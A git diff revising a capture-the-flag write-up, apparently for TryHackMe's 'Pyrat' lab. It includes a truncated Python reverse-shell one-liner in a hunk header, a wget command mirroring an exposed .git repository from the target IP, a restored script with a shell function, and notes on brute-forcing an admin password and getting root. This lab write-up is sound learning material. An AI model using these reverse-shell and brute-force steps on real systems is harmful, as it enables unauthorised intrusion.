@@ -105,7 +105,12 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 </br>then download it all with a wget request from another terminal
 </br>`wget -r http://10.10.253.61:1812`
 
-</br> I'm stupid and saved the git repo as the ip address and 1812 port number as the dir name....
+</br>as a default, the directory downloaded will be saved as the ip address & port number combo...
+</br> I was not aware that the default download created that odd name
+</br> If I wanted to save it, say, on the desktop as "outputFolder" I'd do the following
+</br> `wget -r -P /home/desktop/outputFolder http://10.10.253.61:1812`
+![gotStuffLocalNow](https://github.com/user-attachments/assets/4b3d0549-659e-41ac-a027-4e2ac37cf8f3)
+</br> I got the git archiv info locally now
 
 critical error:
 ```Changes not staged for commit:
@@ -117,10 +122,14 @@ Untracked files:
   (use "git add <file>..." to include in what will be committed)
 	index.html
 ```
-^^^ the copied test from the terminal shows pyrat.py.old, but the stupid terminal itself doesn't show his cricital deleted file! 
 
-let's restore it
-full text of the data.... 
+</br> ^^^ the copied test from the terminal shows pyrat.py.old, but the stupid terminal itself doesn't show his cricital deleted file!
+</br> BEWARE: git status may not display the deleted files properly in all terminals, so copy-paste into a .txt notepad to see if there is visually hidden info (this is a lame misconfiguration on the attack box on THM I was using, and ostensibly, every other user with the built-in attack box will suffer this same error) 
+</br> where the green "x" below is, that's where the hidden text was
+![dumbSavedAsIPAddr](https://github.com/user-attachments/assets/1f87fe0a-cc22-40be-8828-37b93dc5f931)
+
+</br>let's restore that deleted pyrat.py.old file
+</br>full text of the data.... 
 ```
 def switch_case(client_socket, data):
     if data == 'some_endpoint':
@@ -147,13 +156,21 @@ def shell(client_socket):
         send_data(client_socket, e)
 ```
 
-none of that makes any sense ot me
+</br>none of that makes any sense ot me
+</br> ANOTHER brick wall, checking other /var contents for data, I find info in /var/mail
+</br>/var/mail has a leaked email...
+![howThefuckwasISupposedToFindThisYoushitbird](https://github.com/user-attachments/assets/ae006260-b62d-4685-bc6a-c9bd51de078e)
 
-/var/mail has email?
+</br>from email, we get a hint that just typing admin on the port 8000 asks for a password... or we could read that from the old version of the file. So there is some relevancy to that jumbled code-file
+</br> apparently there's another github with the necessary junk code to run a brute-forcer on this unique situation, but...
+![fromEmailINfoGetThis](https://github.com/user-attachments/assets/2b8fe4b3-82b3-4763-a933-4076e61908fb)
 
-from email, we get a hint that just typing admin on the port 8000 asks for a password... or we could read that from the old version of the file
-....
+</br>I brute forced it with python gimmick code from `https://hackmd.io/@nicl4ssic/tryhackme-pyrat-walkthrough`
 
-brute force it with python gimmick code from https://hackmd.io/@nicl4ssic/tryhackme-pyrat-walkthrough
+</br>`(it's just connecting to netcat and trying passwords, really not teaching anything meaningful for me, so I skip messing with this gimmick)`
+</br> basically port 8000 had python running on it, and a script could find the admin credentials with a brute force. We're just doing hydra in an artificial environment, so kind of an anti-climax :/
 
-(it's just connecting to netcat and trying passwords, really not teaching anything meaningful for me, so I skip it)
+![breiuwgbrewg](https://github.com/user-attachments/assets/0e3f085a-dd92-4984-b859-648f3a65cb01)
+
+</br> get root and bug out
+![breiuwgbrewg](https://github.com/user-attachments/assets/74e66ace-51a1-42f6-9119-f92d71ec954b)
